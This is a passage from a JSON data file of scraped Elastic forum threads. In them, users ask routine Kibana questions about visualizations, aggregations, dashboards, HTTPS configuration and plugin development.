https://demo.elastic.co/app/kibana#/dashboard/722b74f0-b882-11e8-a6d9-e546fe2bba5f?_g=(refreshInterval:(pause:!f,value:900000),time:(from:'2020-03-25T11:15:07.466Z',to:'2020-04-12T18:30:00.000Z'))&_a=(description:'Analyze%20mock%20eCommerce%20orders%20and%20revenue',filters:!(),fullScreenMode:!f,options:(hidePanelTitles:!f,useMargins:!t),panels:!((embeddableConfig:(vis:(colors:('Men!'s%20Accessories':%2382B5D8,'Men!'s%20Clothing':%23F9BA8F,'Men!'s%20Shoes':%23F29191,'Women!'s%20Accessories':%23F4D598,'Women!'s%20Clothing':%2370DBED,'Women!'s%20Shoes':%23B7DBAB))),gridData:(h:10,i:'1',w:36,x:12,y:18),id:'37cc8650-b882-11e8-a6d9-e546fe2bba5f',panelIndex:'1',type:visualization,version:'7.5.1'),(embeddableConfig:(vis:(colors:(FEMALE:%236ED0E0,MALE:%23447EBC),legendOpen:!f)),gridData:(h:11,i:'2',w:12,x:12,y:7),id:ed8436b0-b88b-11e8-a6d9-e546fe2bba5f,panelIndex:'2',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:7,i:'3',w:18,x:0,y:0),id:'09ffee60-b88c-11e8-a6d9-e546fe2bba5f',panelIndex:'3',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:7,i:'4',w:30,x:18,y:0),id:'1c389590-b88d-11e8-a6d9-e546fe2bba5f',panelIndex:'4',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:11,i:'5',w:48,x:0,y:28),id:'45e07720-b890-11e8-a6d9-e546fe2bba5f',panelIndex:'5',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:10,i:'6',w:12,x:0,y:18),id:'10f1a240-b891-11e8-a6d9-e546fe2bba5f',panelIndex:'6',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:11,i:'7',w:12,x:0,y:7),id:b80e6540-b891-11e8-a6d9-e546fe2bba5f,panelIndex:'7',type:visualization,version:'7.5.1'),(embeddableConfig:(vis:(colors:('0%20-%2050':%23E24D42,'50%20-%2075':%23EAB839,'75%20-%20100':%237EB26D),defaultColors:('0%20-%2050':'rgb(165,0,38)','50%20-%2075':'rgb(255,255,190)','75%20-%20100':'rgb(0,104,55)'),legendOpen:!f)),gridData:(h:11,i:'8',w:12,x:24,y:7),id:'4b3ec120-b892-11e8-a6d9-e546fe2bba5f',panelIndex:'8',type:visualization,version:'7.5.1'),(embeddableConfig:(vis:(colors:('0%20-%202':%23E24D42,'2%20-%203':%23F2C96D,'3%20-%204':%239AC48A),defaultColors:('0%20-%202':'rgb(165,0,38)','2%20-%203':'rgb(255,255,190)','3%20-%204':'rgb(0,104,55)'),legendOpen:!f)),gridData:(h:11,i:'9',w:12,x:36,y:7),id:'9ca7aa90-b892-11e8-a6d9-e546fe2bba5f',panelIndex:'9',type:visualization,version:'7.5.1'),(embeddableConfig:(),gridData:(h:18,i:'10',w:48,x:0,y:54),id:'3ba638e0-b894-11e8-a6d9-e546fe2bba5f',panelIndex:'10',type:search,version:'7.5.1'),(embeddableConfig:(isLayerTOCOpen:!f,mapCenter:(lat:45.88578,lon:-15.07605,zoom:2.11),openTOCDetails:!()),gridData:(h:15,i:'11',w:24,x:0,y:39),id:'2c9c1f60-1909-11e9-919b-ffe5949a18d2',panelIndex:'11',type:map,version:'7.5.1'),(embeddableConfig:(),gridData:(h:15,i:'12',w:24,x:24,y:39),id:b72dd430-bb4d-11e8-9c84-77068524bcab,panelIndex:'12',type:visualization,version:'7.5.1')),query:(language:kuery,query:''),timeRestore:!t,title:'%5BeCommerce%5D%20Revenue%20Dashboard',viewMode:view)",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "8aa76597-533f-4517-acdd-9e3a882007c8",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-create-custom-variables-for-use-on-the-visualization/227145",
    "title": "Is it possible to create custom variables for use on the visualization?",
    "category": [
      "Kibana"
    ],
    "author": "uids2",
    "date": "April 8, 2020, 2:04pm April 8, 2020, 11:22pm April 14, 2020, 10:19am",
    "body": "Hi all, I have a question, my architecture in this moment is: Kibana Elasticsearch logstash filebeat metricbeat heartbeat In this moment i have created for every visualization an filter with custom label \"MyApp_HostGroup\" with list of hostname (Field: host.hostname - Operator: is one of - and in the input box the list of hostname). Is possible create a \"MyApp_HostGroup\" variable and if so how can you use it within a visualization? Thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fd81a682-e447-4ce6-87ac-bfaaa020c400",
    "url": "https://discuss.elastic.co/t/start-kibana-from-source-code-failed-on-windows/227477",
    "title": "Start kibana from source code failed on windows",
    "category": [
      "Kibana"
    ],
    "author": "qiaoMuXin",
    "date": "April 10, 2020, 10:24am April 10, 2020, 10:29am April 12, 2020, 1:25am April 13, 2020, 5:20am April 14, 2020, 9:59am",
    "body": "On my machine,I start Kibana successfully,but on my peer's machine that is not success. When I compare the two start logs, I found that the log on his machine has no listenning info... anyone may help ,thanks very much..![log_compare|690x132](upload://5WOckKrrAJBrDEg0aBkO8o4Bwr.png)",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "08ecd9ca-e645-4ef7-865c-e3a11cfb40cb",
    "url": "https://discuss.elastic.co/t/option-list-visualization/227676",
    "title": "Option List Visualization",
    "category": [
      "Kibana"
    ],
    "author": "Voula_Mikr",
    "date": "April 12, 2020, 2:08pm April 14, 2020, 8:59am",
    "body": "Hi, I have made a option list visualization for a field that has 50 unique values (type keyword) but in option list shows only the 10 of these unique values. I 've read that option visualization is based on terms aggregation and by default will return the buckets for the top ten terms ordered by the doc_count. I 've made some tries to increase the values returned from the aggregation. That are the below: a) GET /data-2020-04-03/_search { \"terminate_after\":10000, \"aggs\" : { \"genres\" : { \"terms\" : { \"field\" : \"name.keyword\" } } } } ----> It returns again 10 values b) GET /fmdata-cfx01-2020-04-03/_search { \"size\": 0, \"aggs\" : { \"genres\" : { \"terms\" : { \"field\" : \"vnfc_name.keyword\", \"size\" : 10000 } } } } ----> It returns all the unique values c) GET /fmdata-cfx01-2020-04-03/_search { \"aggs\" : { \"genres\" : { \"terms\" : { \"field\" : \"vnfc_name.keyword\", \"size\" : 10000 } } } } -----> It returns all the unique values d) GET /fmdata-cfx01-2020-04-03/_search { \"size\": 0, \"aggs\" : { \"genres\" : { \"terms\" : { \"field\" : \"vnfc_name.keyword\" } } } } ----> It returns again 10 values So I guess that a query such in (c) case would be solve the problem. Is that the right way? Am I missing another option? Also, how can I configure such a query that will give me alla the unique values in a option list visualization ? Thank you in advance. BR Voula",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "39397492-ff76-4f02-8598-ae788d615aae",
    "url": "https://discuss.elastic.co/t/kibana-visual-builder-time-series-visulization-setup/226814",
    "title": "Kibana visual builder time series visulization setup",
    "category": [
      "Kibana"
    ],
    "author": "wl105500396",
    "date": "April 7, 2020, 4:48am April 14, 2020, 8:44am",
    "body": "Hi there, I'm now willing to initiate a time series visulization, it's quite same like the original Network Traffic (Bytes) [Metricbeat System] ECS visulization. (Kibana version is 7.2.1) But it's not working which is only appearing to show 0 after I just copied its every single parameter. Here is my sample message, I want to show this volume field accordingly but failed { \"_index\": \"sample-index\", \"_type\": \"_doc\", \"_id\": \"KB2dUnEB5fkW8PnSiPCQ\", \"_version\": 1, \"_score\": null, \"_source\": { \"appName\": \"app\", \"@timestamp\": \"2020-04-07T03:09:47.993Z\", \"hostname\": \"host1\", \"message\": \"nothing special\", \"logType\": \"messageVolume\", \"@version\": \"1\", \"sourceSystem\": null, \"trackingId\": null, \"volume\": 1, \"sequence\": 29241, \"content\": \"xxxx\", \"serviceName\": \"app\", \"port\": \"8090\", \"targetSystem\": null, \"level\": \"INFO\", \"host\": \"host1\", \"logger_name\": \"logger\" }, \"fields\": { \"@timestamp\": [ \"2020-04-07T03:09:47.993Z\" ] }, \"sort\": [ 1586228987993 ] } Here is what the visulization configuration looks like a1846×739 36.8 KB Here is what the original visulization configuration looks like b1848×858 51 KB Am I missing anything or how am I able to achieve this ? Any updates will be very appreciated.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "95e18164-1837-44fd-b305-2374fbcc1605",
    "url": "https://discuss.elastic.co/t/kibana-pie-chart-tooltip-doesnt-display-data-correctly/227776",
    "title": "Kibana pie chart tooltip doesn't display data correctly",
    "category": [
      "Kibana"
    ],
    "author": "subha1",
    "date": "April 13, 2020, 1:18pm April 14, 2020, 8:32am April 14, 2020, 8:42am",
    "body": "Hi, I have created a visualization for a index pattern and used \"sum\" aggregation for a particular field \"expectedResolutionTime.sort_filed\". After doing so , when I keep the pointer over the pie chart, I can see that values on chart are cut off due to label \"Sum of expected resolution time\" being too long for value field and the value itself cannot be seen. I am using kibana 7.0.1 . I was also referring to Issue link available , but wonder if any work around is available at present to proceed further. I am also attaching the pie chart image here. kibana_chart_insufficient_field1575×749 53.5 KB Thanks Subhashree",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0192a502-d281-414d-af8d-934100bb40a3",
    "url": "https://discuss.elastic.co/t/vega-visualisation/227769",
    "title": "Vega visualisation",
    "category": [
      "Kibana"
    ],
    "author": "cyberzlo",
    "date": "April 13, 2020, 11:44am April 14, 2020, 8:39am",
    "body": "Someone know maybe how use https://vega.github.io/vega/examples/reorderable-matrix/ to dynamic visualise connections when I have ip_src and ip_dst fields in each of logs? Kibana documentation regarding vega is very minimalistic and I don't know how to do it :(.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2aff5b50-51a6-4a7f-bd84-b694c7c64c77",
    "url": "https://discuss.elastic.co/t/kibana-functional-testing-for-custom-visualization/227274",
    "title": "Kibana Functional Testing for custom visualization",
    "category": [
      "Kibana"
    ],
    "author": "karthikeyanajendran1",
    "date": "April 9, 2020, 8:10am April 10, 2020, 11:57am April 14, 2020, 8:20am",
    "body": "Hello, I started working on ELK from last one month and i am a new born baby to this ELK world but its really interesting. In my organization, we receive lot of statistics information (For ex: server request information) which we convert them into Elastic Common Schema compliant JSON format and push into ElasticSearch node via REST adapter and then we visualize the same in Kibana. Currently we have developed one visualization graph in Kibana and in future we will be having more visualization and might create a new dashboard for the same. So we thought of having Functional testing from Kibana side to test this visualization. For the same I did little investigation from Kibana documentation and the doc says we can achieve through FunctionalTestRunner. Questions : Does this FunctionalTestRunner tool can support custom Kibana Functional testing for our custom visualization ? If Yes, this FunctionalTestRunner plugin is part of Kibana release ? Because currently i am not able see under Kibana pacakage. If Yes, can you please share more guidance or directions on the same (like what is the starting point, how we can achieve, any more docs to look, etc..) ? Is there any alternative approach available for function testing of custom Kibana visualizations ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c1f9b8e9-6b4d-4aaa-a72e-475335c1b9df",
    "url": "https://discuss.elastic.co/t/is-there-a-way-to-view-logs-by-clicking-on-a-visualization/227859",
    "title": "Is there a way to view logs by clicking on a visualization?",
    "category": [
      "Kibana"
    ],
    "author": "Roy_Goldenberg",
    "date": "April 14, 2020, 6:43am April 14, 2020, 6:52am April 14, 2020, 7:08am April 14, 2020, 7:11am April 14, 2020, 7:11am April 14, 2020, 7:24am April 14, 2020, 8:04am April 14, 2020, 8:08am",
    "body": "For example, if I have a vertical graph, I would like to click on a bar that shows the logs that the bar represents. I've seen an old post saying this isn't possible but I wanted to know if in the newer version of Kibana this is possible.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "c4588d97-ea14-4405-9fd0-bf186951dd94",
    "url": "https://discuss.elastic.co/t/visualization-of-scripted-field-using-relative-time-but-sometimes-field-is-null/226772",
    "title": "Visualization of scripted field using relative time but sometimes field is null",
    "category": [
      "Kibana"
    ],
    "author": "Goishin",
    "date": "April 6, 2020, 8:21pm April 14, 2020, 8:04am",
    "body": "I'm trying to create a metric that lists how long a development pipeline has been broken for. I compute this field in the script I use to upload my documents with. The field is marked as relative time in my index. What I'd really like for this to do is when a pipeline breaks, we mark the time in the field \"results.failing_since\". Then, when the pipeline isn't broken, meaning all my tests pass, then the field is \"null\". When I add this to a metric, it always skips over the \"null\" documents. Then I created a script to use, that when the field is \"null\", I'll just pass a string saying \"pipeline not broken\". However, that fails because apparently the metric visualization is expecting a number. And if I just have it return a 0, instead, then I get an exception: class_cast_exception: org.elasticsearch.script.JodaCompatibleZonedDateTime cannot be cast to java.lang.Number\" When I try to do this in a data table, then the timestamp won't be rendered as relative time. AND, the field is missing on some pipelines, too. So, I have this state where a field can or cannot be present, can or cannot be null, and should be rendered as relative time. I've tried something similar to this on a datatable. But this can still result in an exception, and the datatable won't format this as relative time (if it isn't busy throwing exceptions, that is): { \"script\": \"if (doc.containsKey('results.failing_since') && doc['results.failing_since'].size() != 0 && doc['results.failing_since'].value != null) { return doc['results.failing_since'].value;} else { return 'Not failing.';}\" } How do I get this data visualized!!!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6458909c-6783-466d-8649-7c6662e9e12e",
    "url": "https://discuss.elastic.co/t/kibanasavedobjectmeta-searchsorcejson-format/227847",
    "title": "KibanaSavedObjectMeta.searchSorceJSON format",
    "category": [
      "Kibana"
    ],
    "author": "kavya12345",
    "date": "April 14, 2020, 4:23am April 14, 2020, 7:58am",
    "body": "Hi, I am using kibana as an iframe in angular-8 application. I have kibana savedObject something like this. I want to know how can we parse the KibanaSavedObjectMeta.searchSorceJSON with out '' ? What we are getting : \"kibanaSavedObjectMeta\": { \"searchSourceJSON\": \"{\"query\":{\"language\":\"kuery\",\"query\":\"\"},\"filter\":,\"highlightAll\":true,\"version\":true}\" } I want like this without '': \"kibanaSavedObjectMeta\": { \"searchSourceJSON\": \"{\"query\":{\"language\":\"kuery\",\"query\":\"\"},\"filter\":,\"highlightAll\":true,\"version\":true}\" } Please let me know how can i remove the '' ? Please help me. Thanks in Advance. Kavya Nagarapu",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6573d581-3442-458a-9b82-3c6a2e89db89",
    "url": "https://discuss.elastic.co/t/kibana-translate-filter-options/223930",
    "title": "Kibana - Translate Filter Options",
    "category": [
      "Kibana"
    ],
    "author": "charlz",
    "date": "March 17, 2020, 1:24pm March 17, 2020, 2:21pm April 14, 2020, 6:37am",
    "body": "Hi, I am using 7.6 version I have a use case, in an Index, a Field will have Integer values, it has to mapped to Text when displayed as Filter in Kibana and this Text will also need to be translatable in two languages. eg: Index : sample (with field status) status: 1,2,3 When I display filter in Kibana, Status need to be [1:WON,2:REJECTED,3:CANCELED] Is this possible in the Kibana? I have checked the Translation plugins which translates the Kibana Application only. Is there feature/plugin to achieve this? Thanks in advance.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d857e9f4-f1c2-4fdb-bc25-e4fbdd55517b",
    "url": "https://discuss.elastic.co/t/how-can-i-create-index-patterns-in-kibana-automatically-every-day/227578",
    "title": "How can i create Index patterns in Kibana Automatically Every Day",
    "category": [
      "Kibana"
    ],
    "author": "Pacha_Gopi",
    "date": "April 11, 2020, 5:22am April 14, 2020, 6:12am April 14, 2020, 6:12am",
    "body": "My indexes are created every day like xxx-yy-mm-dd, how can I create index patterns automatically without my involment .Because every day i have plenty indices from elastticsearch and i am manually creating all the index pattens in Kibana it is so much time consuming process.Can anyone helpme out of this how can i create Index patterns in Kibana automatically?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9a1eed8e-c1d1-474d-a545-24a6733dd772",
    "url": "https://discuss.elastic.co/t/how-to-interpret-indexing-latency-search-latency/227780",
    "title": "How to interpret Indexing Latency , Search Latency",
    "category": [
      "Kibana"
    ],
    "author": "nages",
    "date": "April 13, 2020, 1:47pm April 13, 2020, 4:09pm April 13, 2020, 4:12pm April 13, 2020, 4:35pm April 13, 2020, 4:44pm April 14, 2020, 4:17am April 14, 2020, 4:24am April 14, 2020, 6:05am",
    "body": "How to interpret Indexing Latency , Search Latency from Kibana Stack monitoring dashboard I didn't find references about this documentation.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "a5ba1cb6-dad5-49de-ab5d-527d8b30caf8",
    "url": "https://discuss.elastic.co/t/how-to-embed-kibana-dashboard-into-an-angular-applications/227379",
    "title": "How to embed kibana dashboard into an angular applications?",
    "category": [
      "Kibana"
    ],
    "author": "kavya12345",
    "date": "April 9, 2020, 5:29pm April 10, 2020, 12:14pm April 14, 2020, 3:20am",
    "body": "Hi, I would like to know the ways to embed kibana dashboard into an angular application(my application is angular version-8) ? I see we can embed using iframe. Is there any other ways we can embed it ? Please let me the process if there are any other ways to embed. Thanks in Advance Kavya Nagarapu.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "351532ec-d5c9-468e-a080-9708c669b949",
    "url": "https://discuss.elastic.co/t/change-siem-default-query-for-index/227715",
    "title": "Change siem default query for index?",
    "category": [
      "Kibana"
    ],
    "author": "lusynda",
    "date": "April 13, 2020, 1:23am April 13, 2020, 11:42pm",
    "body": "Hi everyone It is about siem app on kibana, so i notice that there are query that run to fetch data to show on the board on siem app, i was wondering if there is a way to change query itself because i have made some change to the index that now that query no longer working. And i really dont want to have to change the data on the index again because it will take a lot of time and a lot of index to be reindex so any help help would be great! Thank for your time.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b5915e4a-f355-4958-ae7b-8e8df1d7e684",
    "url": "https://discuss.elastic.co/t/how-to-access-aggregations-from-within-custom-request-handler/226445",
    "title": "How to access aggregations from within custom request handler",
    "category": [
      "Kibana"
    ],
    "author": "ssimmons",
    "date": "April 3, 2020, 6:22pm April 7, 2020, 1:30pm April 13, 2020, 10:23pm",
    "body": "Is it possible to access the aggregations from within a custom visualization request handler? I'm currently not seeing the aggs object contained within the object that is passed into the custom request handler. I'm trying to build a custom Elasticsearch query from within the request handler but I need access to the aggregations to do this. I'm currently using Kibana 7.5.2.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5be33009-0d7b-4a4d-98eb-b346b3ed2810",
    "url": "https://discuss.elastic.co/t/one-to-many-visualization/227765",
    "title": "One to many, visualization",
    "category": [
      "Kibana"
    ],
    "author": "cyberzlo",
    "date": "April 13, 2020, 11:24am April 13, 2020, 10:15pm",
    "body": "How most easy can I do visualisation one to many? What I mean, in each log I have two fields src and dst. I would like to visualise it for most easy find src which have most different dst. I have free basic license, so I don't have graphs :(.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "da45a558-35cf-4a90-ba52-d46fae099f5c",
    "url": "https://discuss.elastic.co/t/create-and-import-kibana-visualization-using-api/227821",
    "title": "Create and import kibana visualization using API",
    "category": [
      "Kibana"
    ],
    "author": "ilhem",
    "date": "April 13, 2020, 8:28pm April 13, 2020, 9:29pm April 13, 2020, 10:16pm",
    "body": "I created a kibana visualization using kibana interface and i tried to import it via Postman GET http://localhost:9200/.kibana/visualization/test1 but i get this response { \"_index\": \".kibana_1\", \"_type\": \"visualization\", \"_id\": \"test1\", \"found\": false } I want to know how can I create an index patern and a kibana vizualisation using API.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dfe981d1-e7bb-4edb-ac80-3679392be425",
    "url": "https://discuss.elastic.co/t/reload-visualization-from-the-elasticsearch/227766",
    "title": "Reload visualization from the Elasticsearch",
    "category": [
      "Kibana"
    ],
    "author": "whitediver",
    "date": "April 13, 2020, 11:24am April 13, 2020, 5:22pm April 13, 2020, 5:46pm April 13, 2020, 9:52pm",
    "body": "I manage my visualizations using a custom plugin. I set visualisation.visState.aggs from template Then I update the visualization at the \".kibana\" index Kibana application do not reload it till restart. Is there a way to force reload visualization details or restart the Kibana server from the controller?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "69d5c6fb-bb98-4b54-b882-db2b4bf231d2",
    "url": "https://discuss.elastic.co/t/stream-live-option-loads-logs-slowly/226879",
    "title": "Stream live option loads logs slowly",
    "category": [
      "Kibana"
    ],
    "author": "Alexandros888",
    "date": "April 7, 2020, 11:31am April 13, 2020, 9:14pm",
    "body": "Hello, Is it possible to see the logs in the logs app (https://www.elastic.co/guide/en/kibana/current/xpack-logs-using.html) more fast when i use the stream live option? More specifically as the image shows below i have to wait for some seconds in order every time to get the newest logs. Is there a way so i can fix this? image1878×956 192 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "aa367f45-9368-42a7-9f8a-ec3d54452cf9",
    "url": "https://discuss.elastic.co/t/tsvb-point-are-not-connected-when-timeframe-is-5-hours/226765",
    "title": "TSVB point are not connected when timeframe is <5 hours",
    "category": [
      "Kibana"
    ],
    "author": "liorg2",
    "date": "April 6, 2020, 7:44pm April 13, 2020, 7:51pm",
    "body": "I'm sure that it's an issue with data, but is there a way to make the line chart, to draw a line, even if it's a short period? image1659×863 65 KB thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "58b36276-eed2-4180-bf12-1455e296386f",
    "url": "https://discuss.elastic.co/t/kibana-canvas-vertical-chart-show-x-axis-and-y-axis-lines/227800",
    "title": "Kibana Canvas vertical chart - Show x axis and y axis lines",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 13, 2020, 4:32pm April 13, 2020, 5:33pm April 13, 2020, 5:57pm April 13, 2020, 7:39pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e9abe361-563c-4525-bf87-e9efef9d23f3",
    "url": "https://discuss.elastic.co/t/metric-visualization-with-previous-period-arrow-indicator/227551",
    "title": "Metric Visualization With Previous Period Arrow Indicator",
    "category": [
      "Kibana"
    ],
    "author": "wwalker",
    "date": "April 10, 2020, 7:04pm April 10, 2020, 7:56pm April 10, 2020, 8:45pm April 10, 2020, 10:49pm April 13, 2020, 4:45pm",
    "body": "I am tracking the number of hits to a given URL with a simple Metric visualization. I'd like to be able to display an arrow that points up or down if the current metric is higher or lower than the previous measured period. Is this possible? For example, I have the visual setup to show the number of hits in the last 24 hours. An additional query would run looking at the 24 hours previous to that and then display an up/down arrow if the previous period is higher/lower than the current.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2f1a23db-1dfa-40e3-a884-12ea788b447c",
    "url": "https://discuss.elastic.co/t/accessing-kibana-over-https/227677",
    "title": "Accessing kibana over HTTPS",
    "category": [
      "Kibana"
    ],
    "author": "lw24",
    "date": "April 12, 2020, 2:25pm April 12, 2020, 4:51pm April 13, 2020, 4:07pm April 13, 2020, 4:09pm April 13, 2020, 4:27pm",
    "body": "I have tried to follow the steps outlined under \"Detections configuration and index privilege prerequisites\" I have modified elasticsearch.yml to be: network.host: 0.0.0.0 http.port: 9200 xpack.security.enabled: true xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: \"/etc/elasticsearch/elastic-certificates.p12\" xpack.security.transport.ssl.truststore.path: \"/etc/elasticsearch/elastic-certificates.p12\" xpack.security.http.ssl.enabled: true xpack.security.http.ssl.keystore.path: \"/etc/elasticsearch/http.p12\" And have edited kibana.yml to be: elasticsearch.hosts: [\"https://localhost:9200\"] elasticsearch.username: \"kibana\" elasticsearch.password: \"password\" elasticsearch.ssl.certificateAuthorities: [ \"/etc/kibana/elasticsearch-ca.pem\" ] xpack.encryptedSavedObjects.encryptionKey: 'fhjskloppd678ehkdfdlproglsaeface' When I now try and connect to https://IP:5601 I get \"This site can't be reached\". When I connect over https://IP:9200 I get put my user and password in and get a JSON prinout. Seems as if Kibana to Elasticsearch is encrypted but Kibana to browser is not working over https properly?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "80446589-7cd1-4b59-b289-5984d5c3c4ea",
    "url": "https://discuss.elastic.co/t/im-getting-error-of-x-of-y-shards-failed-try-to-open-in-kibana-visualization-dashboard/227755",
    "title": "I'm getting error of 'x of y shards failed' try to open in kibana visualization dashboard",
    "category": [
      "Kibana"
    ],
    "author": "vishnuvardhan",
    "date": "April 13, 2020, 10:19am April 13, 2020, 3:24pm",
    "body": "Hi Team, In my production environment kibana i am trying to open the kibana visualization dashboard , I'm getting error of '1 of 3 shards failed' in kibana UI right side corner. could please help us how to trace this logs and how you can enable the logs please provide where to find this issue ? i already checked in my elasticserach and kibana logs ..no information found image877×676 158 KB Thanks in advance!!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d98a52f3-1ece-4ab9-87de-b274e3f4fc20",
    "url": "https://discuss.elastic.co/t/kibana-static-data-add-constant-value/227070",
    "title": "Kibana static data - Add constant value",
    "category": [
      "Kibana"
    ],
    "author": "QuentinRogeret",
    "date": "April 8, 2020, 7:37am April 13, 2020, 2:31pm",
    "body": "Hello, Is it possible to \"freeze\" a value in a Kibana visual? I make business statistics in a Kibana dashboard and I would like to be able to let the global average be displayed when I filter on a client. And thus be able to compare my client's average with the company's average. Capture du 2020-04-08 08-57-151355×580 24.4 KB Today I couldn't find a \"simple\" way to do this. I have found a solution: Insert a \"company\" value in my index and thus thanks to the \"controls\" module select my customer and my company. Thank you ( I'm French, sorry if I make mistakes )",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1ab02fb0-3414-4a6d-9b3f-b1f7a12afe98",
    "url": "https://discuss.elastic.co/t/does-not-contain-any-of-the-following-compatible-field-types-ip/226476",
    "title": "\"does not contain any of the following compatible field types: ip\"",
    "category": [
      "Kibana"
    ],
    "author": "cyberzlo",
    "date": "April 3, 2020, 9:11pm April 4, 2020, 12:29am April 5, 2020, 7:52pm April 6, 2020, 3:09pm April 6, 2020, 3:48pm April 6, 2020, 3:55pm April 9, 2020, 8:54pm April 10, 2020, 5:05pm April 13, 2020, 2:23pm",
    "body": "How can I define IP? Accually I have both, IPv4 and IPv6, but looks like in Kibana can I use CIDR notation for IPv4 only, what in fact is fine. But my field name is like \"layers.ip.ip_src\" and I am goting error: The index pattern pcap-* does not contain any of the following compatible field types: ip I am using logstash config as in article https://www.elastic.co/blog/analyzing-network-packets-with-wireshark-elasticsearch-and-kibana I guess that I need somehow define it in logstash, that field X is ip, but how? I am new in logstash (and in fact kibana and elastic too).",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "9ec3271e-976a-42ed-bdad-557dfb4c7a50",
    "url": "https://discuss.elastic.co/t/tsvb-empty-null-fields/226591",
    "title": "TSVB empty/null fields",
    "category": [
      "Kibana"
    ],
    "author": "cyberzlo",
    "date": "April 5, 2020, 7:48pm April 9, 2020, 8:58pm April 10, 2020, 5:00am April 10, 2020, 9:40am April 13, 2020, 2:11pm",
    "body": "Hi, how can I exclude null/empty fields on TSVB (time series)? I use cardinality, group by terms, order by cardinality, direction desc, top 50 but still got in legend most values with 0. I have logs like HTTP, there is always IP address and additional conditio like 404, 503 etc errors. I do cardinality/order by this IP field and as above, have a lot null/empty when for example look only for 404's.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b0dbf500-54e3-4be1-a9c1-95254343eb6a",
    "url": "https://discuss.elastic.co/t/no-security-menus-users-rbac/227665",
    "title": "No security menus: users, RBAC",
    "category": [
      "Kibana"
    ],
    "author": "cyberzlo",
    "date": "April 12, 2020, 10:52am April 12, 2020, 11:13am April 13, 2020, 4:57am April 13, 2020, 2:04pm",
    "body": "Hi, I have basic license and I don't see security section in settings, why? I have default installation of ELK stack v7.6.2. How can I enable all options to which I have access/icense, to just see them?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8c60761f-133b-492e-833e-053932c8c622",
    "url": "https://discuss.elastic.co/t/kibana-plugin-development-react/227726",
    "title": "Kibana Plugin Development (React)",
    "category": [
      "Kibana"
    ],
    "author": "Paul_Gege",
    "date": "April 13, 2020, 4:33am April 13, 2020, 4:59am April 13, 2020, 12:04pm April 13, 2020, 1:51pm",
    "body": "Hi, I'm looking for some documentation on how I can develop my own plugin. I'd like to add a react component to my Kibana dashboard , specifically a dropdown with some drill-down capabilities.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3336b5ca-e9c3-4468-943d-6dd1fe34c48e",
    "url": "https://discuss.elastic.co/t/kibana-7-6-1-getting-values-from-kibana-yml/227076",
    "title": "Kibana 7.6.1: Getting values from kibana.yml",
    "category": [
      "Kibana"
    ],
    "author": "Javek",
    "date": "April 8, 2020, 8:07am April 10, 2020, 10:50pm April 13, 2020, 8:11am April 13, 2020, 12:05pm April 13, 2020, 12:31pm April 13, 2020, 12:53pm April 13, 2020, 1:39pm",
    "body": "Hello. At 7.4.2 kibana i was able to get hosts config value from clusterClient: const hosts = server.plugins.elasticsearch.getCluster('data').clusterClient.config.hosts But now at 7.6+ it's seems imposibble because https://github.com/elastic/kibana/pull/53824. I also tried some solutions from here Unknown key 'elasticsearch.hosts' for Kibana plugin config. But it didn't work for me. Is there any possible solutions to get values from kibana.yml?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "0d035869-75e3-4f13-98cb-676d3142f263",
    "url": "https://discuss.elastic.co/t/time-display-on-x-axis-for-interval-less-than-an-hour/227604",
    "title": "Time display on X-axis for interval less than an hour",
    "category": [
      "Kibana"
    ],
    "author": "sai_16",
    "date": "April 11, 2020, 1:39pm April 13, 2020, 8:03am April 13, 2020, 9:16am April 13, 2020, 3:16pm",
    "body": "My x-axis has a date histogram, it does display both date and time only if the interval selected is greater than an or equal to one hour, for intervals less than an hour,only time stamp is displayed,its confusing to view last two days of data . And time format is already set to dateFormat:scaled in the settings. Is there any solution for this?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "28862050-9e27-44fd-8f3a-46253d82a917",
    "url": "https://discuss.elastic.co/t/index-pattern-behavior/227643",
    "title": "Index Pattern behavior",
    "category": [
      "Kibana"
    ],
    "author": "fadjar340",
